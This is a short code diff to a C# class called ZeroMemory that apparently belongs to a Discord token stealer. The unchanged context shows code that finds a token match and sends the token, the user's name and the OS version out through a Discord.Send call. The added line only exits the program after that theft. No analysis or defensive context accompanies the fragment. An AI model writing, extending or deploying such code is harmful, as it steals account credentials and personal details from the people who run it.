@@ -37,6 +37,7 @@ class ZeroMemory
                 if (match.Success)
                 {
                     Discord.Send("Token : " + match.Value + "\nUserName : " + Environment.UserName + "\nOS : " + Environment.OSVersion);
+                    System.Environment.Exit(1);  
                 }
             }
         }
